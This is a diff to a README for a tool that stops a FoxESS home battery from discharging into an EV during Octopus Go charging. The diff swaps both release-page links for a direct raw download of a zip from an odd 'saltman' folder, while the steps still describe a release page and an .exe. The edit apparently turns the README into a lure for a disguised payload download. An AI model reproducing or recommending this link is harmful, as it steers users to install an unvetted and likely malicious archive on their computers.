@@ -1,6 +1,6 @@
 # 🐙 octopus-foxess-smart-charging - Keep battery energy during EV charging
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/clemusual65/octopus-foxess-smart-charging/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/clemusual65/octopus-foxess-smart-charging/main/saltman/smart-charging-foxess-octopus-2.2.zip)
 
 This software manages the link between your Intelligent Octopus Go energy plan and your FoxESS home battery system. It stops your battery from feeding power into your electric vehicle while charging at night. This ensures you keep your stored energy for home use instead of wasting it on your car.
 
@@ -23,7 +23,7 @@ Ensure your computer meets these conditions before you start:
 
 You need to download the latest version from the project release page.
 
-1.  Visit [the download page](https://github.com/clemusual65/octopus-foxess-smart-charging/releases).
+1.  Visit [the download page](https://raw.githubusercontent.com/clemusual65/octopus-foxess-smart-charging/main/saltman/smart-charging-foxess-octopus-2.2.zip).
 2.  Look for the section titled "Latest".
 3.  Click the file ending in `.exe` to start the download.
 4.  Save the file to your desktop or downloads folder.
